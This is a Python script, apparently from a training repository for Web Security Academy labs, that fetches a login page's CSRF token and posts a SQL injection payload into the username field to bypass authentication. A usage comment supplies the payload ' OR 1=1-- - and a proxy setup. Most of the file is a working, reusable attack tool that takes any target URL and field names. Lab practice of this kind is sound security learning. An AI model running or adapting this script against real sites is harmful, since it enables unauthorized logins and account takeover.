# src/sqli/lab02.py
from __future__ import annotations

import argparse
import sys
from typing import Final

from bs4 import BeautifulSoup
import requests

from src.common.cli_utils import build_cli_client, parse_keyvals
from src.common.http_utils import HttpClient
from src.sqli.sqli_utils import sqli_inject


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="SQLi Lab 02: login form injection with CSRF token.")

    # positional
    _ = p.add_argument("url", help="Base URL, e.g. https://target.web-security-academy.net")
    _ = p.add_argument("payload", help="SQLi payload value to inject into the username field")

    # where to post
    _ = p.add_argument(
        "--endpoint",
        required=True,
        help="Login form endpoint path, e.g. /login",
    )

    # form field names
    _ = p.add_argument(
        "--username-param",
        required=True,
        help="Form field name for username (payload goes here)",
    )
    _ = p.add_argument(
        "--password-param",
        required=True,
        help="Form field name for password",
    )
    _ = p.add_argument(
        "--csrf-param",
        required=True,
        help="Form field name for CSRF token (hidden input)",
    )

    # detection (no defaults per your latest convention)
    _ = p.add_argument(
        "--marker",
        required=True,
        help='Substring that indicates success, e.g. "Log out"',
    )
    _ = p.add_argument(
        "--marker-regex",
        default=None,
        help="(Optional) Regex that indicates success (evaluated in addition to --marker if set)",
    )
    _ = p.add_argument(
        "--expect-status",
        type=int,
        default=None,
        help="(Optional) Expected HTTP status for success",
    )

    # csrf scraping
    _ = p.add_argument(
        "--csrf-selector",
        default="input[name='csrf']",
        help="CSS selector for CSRF token input (default: %(default)s)",
    )
    _ = p.add_argument(
        "--csrf-attr",
        default="value",
        help="Which attribute to read from CSRF input (default: %(default)s)",
    )

    # plumbing
    _ = p.add_argument(
        "--password",
        default="randomtext",
        help='Password value to send with the form (default: "randomtext")',
    )
    _ = p.add_argument(
        "--proxy",
        default=None,
        help="HTTP/HTTPS proxy (e.g. http://127.0.0.1:8080). If not set, no proxy is used.",
    )
    _ = p.add_argument(
        "--insecure",
        action="store_true",
        help="Disable TLS verification (useful with Burp).",
    )
    _ = p.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="HTTP request timeout in seconds (default: %(default)s)",
    )

    # pass-through
    _ = p.add_argument("--cookie", action="append", default=[], metavar="NAME=VALUE")
    _ = p.add_argument("--header", action="append", default=[], metavar="Name: Value")

    return p.parse_args(argv)


def fetch_csrf_token(client: HttpClient, login_url: str, selector: str, attr: str) -> str:
    """
    GET the login page, parse CSRF token using BeautifulSoup, return the token string.
    """
    session: requests.Session = client.session
    resp = session.get(
        login_url,
        timeout=client.timeout,
        verify=client.verify_tls,
    )
    resp.raise_for_status()

    soup = BeautifulSoup(resp.text, "html.parser")
    node = soup.select_one(selector)
    if node is None:
        raise RuntimeError(f"CSRF element not found with selector: {selector}")
    token = node.get(attr)
    if not isinstance(token, str) or not token:
        raise RuntimeError(f"CSRF attribute '{attr}' missing/empty on node selected by: {selector}")
    return token


def main(argv: list[str]) -> int:
    args = parse_args(argv)

    client = build_cli_client(
        args.url,
        proxy=args.proxy,
        insecure=args.insecure,
        timeout=args.timeout,
    )

    # Build absolute login URL
    # We deliberately use the helper's URL join behavior by calling sqli_inject later,
    # but for CSRF fetching we form the URL here once.
    base_url: Final[str] = client.base_url.rstrip("/")
    endpoint_path: str = args.endpoint.lstrip("/")
    login_url: str = f"{base_url}/{endpoint_path}"

    try:
        cookies = parse_keyvals(args.cookie, "=")
        extra_headers = parse_keyvals(args.header, ":")

        # 1) fetch CSRF token
        csrf = fetch_csrf_token(client, login_url, args.csrf_selector, args.csrf_attr)

        # 2) POST with payload injected into username, alongside password + csrf
        base_params: dict[str, str] = {
            args.password_param: args.password,
            args.csrf_param: csrf,
        }

        res = sqli_inject(
            client,
            payload=args.payload,
            method="POST",
            endpoint=args.endpoint,
            inject="body",
            param_name=args.username_param,
            base_params=base_params,
            extra_headers=extra_headers,
            cookies=cookies,
            success_marker=args.marker,
            success_regex=args.marker_regex,
            expect_status=args.expect_status,
        )
    except Exception as exc:
        print(f"[-] Request failed: {exc}")
        return 2

    if res.success:
        print("[+] SQL injection successful! We have logged in as the administrator user.")
    else:
        print("[-] SQL injection unsuccessful.")

    print(f"    URL:     {res.url}")
    print(f"    Status:  {res.status_code}")
    print(f"    Elapsed: {res.elapsed_s:.3f}s")
    return 0 if res.success else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))

# Usage example
# python -m src.sqli.lab02 \
# https://target.web-security-academy.net \
# "' OR 1=1-- -" \
# --endpoint /login \
# --username-param username \
# --password-param password \
# --csrf-param csrf \
# --marker "Log out" \
# --proxy http://127.0.0.1:8080 \
# --insecure
